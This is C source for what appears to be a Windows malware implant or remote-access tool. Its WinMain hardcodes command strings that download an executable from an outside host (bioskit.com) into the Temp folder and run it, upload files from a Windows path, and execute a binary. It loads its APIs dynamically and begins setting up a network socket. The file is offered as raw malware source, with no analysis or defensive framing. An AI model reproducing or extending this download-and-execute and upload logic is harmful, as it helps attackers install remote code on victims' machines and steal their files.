#include "Server.h"
#include "RunTimeCheck.h"
#include "CommandLine.h"
#include "ApiBlock.h"

int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
    PCOMMAND_LINE_PACK pDownloadCmdLine;
    PCOMMAND_LINE_PACK pUploadCmdLIne;
    PCOMMAND_LINE_PACK pExecuteCmdLine;
    CHAR pCmdLine[] = {"@GodsElohim@Download@:Http:bioskit.com/fuck.exe:System:Windows:Path:\\Temp:Type:Exe:Command:Run;"};
    CHAR pCmdLineUpload[] = {"@GodsElohim@Upload@:System:Windows:Path:\\Temp;"};
    CHAR pCmdLineExecute[] = {"@GodsElohim@Execute@:Command:Run:Type:Exe:System:Windows:Path:\\Test.Exe;"};
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
    
    //ULONG ulCmdCount;

    InitializeApiBlock();

    if (CheckRepeatRun(NULL) == FALSE)
    {
        return -1;
    }
    //Upload:System:Windows:RemotePath:\Temp;
    //Download:Http:bioskit.com/fuck.exe:System:Windows:Path:\Temp;
    //Execute:Command:Run:Type:Exe:System:Windows:Path:\Test.Exe;
    //Download:Http:bioskit.com/fuck.exe:System:Windows:Path:\Temp:Type:Exe:Command:Run;
    ProcessCommandLine((PCHAR)pCmdLine,&pDownloadCmdLine);
    ProcessCommandLine((PCHAR)pCmdLineUpload,&pUploadCmdLIne);
    ProcessCommandLine((PCHAR)pCmdLineExecute,&pExecuteCmdLine);
	return 0;
}
void StartLogin()
{
    WSADATA wsaData;
    HANDLE hEvent;
    BOOLEAN bIsRunning;
    SOCKET Socket;
    //ULONG uli;

    bIsRunning = FALSE;
    Socket = INVALID_SOCKET;

    g_WinSocket2ApiBlock.WSAStartup(MAKEWORD(2,2),&wsaData);
    hEvent = g_Kernel32ApiBlock.MyCreateEventW(NULL,TRUE,FALSE,NULL);

}
